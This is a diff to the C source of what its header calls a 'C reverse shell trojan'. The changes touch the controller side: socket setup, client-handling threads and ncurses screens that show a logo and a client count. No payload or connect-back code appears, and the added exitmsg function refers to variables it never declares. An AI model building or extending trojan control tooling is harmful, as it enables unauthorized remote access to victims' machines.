@@ -4,7 +4,7 @@
  * Made by p4p1
  *
  * C reverse shell trojan
- * Do not use this for elegal purposes
+ * Do not use this for illegal purposes
  ****/
  /*
   *
@@ -133,9 +133,13 @@ void init_variables(struct server_info * inf, char * argv[])
 	inf->server.sin_addr.s_addr = INADDR_ANY;
 	inf->server.sin_port = htons( inf->portno );
 
+	inf->argo.ncr = 0;
+	inf->argo.cli = 0;
+	inf->argo.graphic = 0;
+
 	serverThread.saved_sockets = (int *) malloc(NUMOCLIENTS * sizeof(int));
 	serverThread.cliNum = '0';
-	serverThread.connectedTo = 0;
+	serverThread.connectedTo = 10;
 
 	if(inf->s == -1){
 		error("Can't init socket.", -1);
@@ -166,6 +170,7 @@ void init_threads(struct server_info * inf)
 		int * t = &i;
 		pthread_create( &serverThread.onConnect[i], NULL,
 			 connection_handler, (void *) t );
+		sleep(1);
 
 	}
 
@@ -186,18 +191,11 @@ void pscreen(char * str, int x, int y)
 void quit(int c, int s)
 {
 	int row, col;
-	getmaxyx(stdscr, row, col);
+
 
 	clear();
 	close(s);
-	mvprintw(0, 0, "       _ _       _\n");
-	mvprintw(1, 0, "  _ __| | | _ __/ |\n");
-	mvprintw(2, 0, " | '_ \\_  _| '_ \\ |\n");
-	mvprintw(3, 0, " | .__/ |_|| .__/_|\n");
-	mvprintw(4, 0, " |_|       |_|\n");
-	mvprintw( row / 2, (col-26) /2, "thank you for using byebye");
-	refresh();
-	getch();
+
 	endwin();
 	exit(c);
 }
@@ -207,16 +205,16 @@ void quit(int c, int s)
  ***/
 void printlogo(struct server_info * inf)
 {
+	if(inf->argo.ncr){
+		getmaxyx(stdscr, inf->win.row, inf->win.col);
 
-	getmaxyx(stdscr, inf->win.row, inf->win.col);
-
-	mvprintw(0, 0, "       _ _       _\n");
-    	mvprintw(1, 0, "  _ __| | | _ __/ |\n");
-    	mvprintw(2, 0, " | '_ \\_  _| '_ \\ |\n");
-    	mvprintw(3, 0, " | .__/ |_|| .__/_|\n");
-    	mvprintw(4, 0, " |_|       |_|\n");
-	mvprintw(2, (inf->win.col )/2, "[NumberOfClients: %c]", serverThread.cliNum);
-
+		mvprintw(0, 0, "       _ _       _\n");
+	    	mvprintw(1, 0, "  _ __| | | _ __/ |\n");
+	    	mvprintw(2, 0, " | '_ \\_  _| '_ \\ |\n");
+	    	mvprintw(3, 0, " | .__/ |_|| .__/_|\n");
+	    	mvprintw(4, 0, " |_|       |_|\n");
+		mvprintw(2, (inf->win.col )/2, "[ NumberOfClients: %c ]", serverThread.cliNum);
+	}
 }
 
 /*
@@ -247,4 +245,20 @@ void clastrow()
 		mvprintw(row-1, i, " ");
 	}
 
+}
+
+
+void exitmsg()
+{
+	if(inf->argo.ncr){
+		getmaxyx(stdscr, row, col);
+		mvprintw(0, 0, "       _ _       _\n");
+		mvprintw(1, 0, "  _ __| | | _ __/ |\n");
+		mvprintw(2, 0, " | '_ \\_  _| '_ \\ |\n");
+		mvprintw(3, 0, " | .__/ |_|| .__/_|\n");
+		mvprintw(4, 0, " |_|       |_|\n");
+		mvprintw( row / 2, (col-26) /2, "thank you for using byebye");
+		refresh();
+		getch();
+	}
 }
